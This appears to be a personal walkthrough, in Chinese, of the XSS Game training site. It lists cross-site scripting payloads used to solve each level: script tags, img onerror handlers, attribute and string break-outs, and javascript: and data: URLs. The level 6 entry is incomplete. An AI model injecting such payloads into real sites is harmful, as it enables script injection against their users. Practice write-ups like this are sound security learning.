# XSS Game
[XSS Game](https://xss-game.appspot.com/)

## LEVEL 1 (Reflected XSS)

1. 輸入 hello
2. 測試 <h1>hello</h1>，發現 HTML tag 會被解析
3. 測試 <script>alert('xss')</script>，發現 script tag 會被解析
4. 結束

## LEVEL 2 (Stored XSS)

1. 輸入 hello
2. 測試 <h1>hello</h1>，發現 HTML tag 會被解析
3. 測試 <script>alert('xss')</script>，發現 script tag 沒有被解析
4. 測試 <img src=x onerror=alert('xss') />，發現 img tag 會被解析
5. 結束

## LEVEL 3 (DOM-based XSS)

1. 點選 `Image 1` , `Image 2` , `Image 3` 對應的 link 為 `frame#1` , `frame#2` , `frame#3`
2. 輸入 `#4`  => Images 4 且破圖
3. 輸入 `#<h1>4</h1>` => Image NaN
4. 測試 `'` (失敗) 或 `"` (成功)
5. 測試 `#' onerror=alert('') />` (成功)
6. 結束

## LEVEL 4

1. 輸入 `xss`
2. 檢視原始碼 `<img src="/static/loading.gif" onload="startTimer('x');" />`
3. 輸入 `');alert('xss`
4. 結束

## LEVEL 5 

1. 點選 Sign Up
2. 檢視 `Next >>` 的原始碼 `<a href="confirm">Next >></a>`
3. next=javascript:alert('xss') 點選 Next >>

## LEVEL 6

1. 
2. #data:text/plain,alert('xss')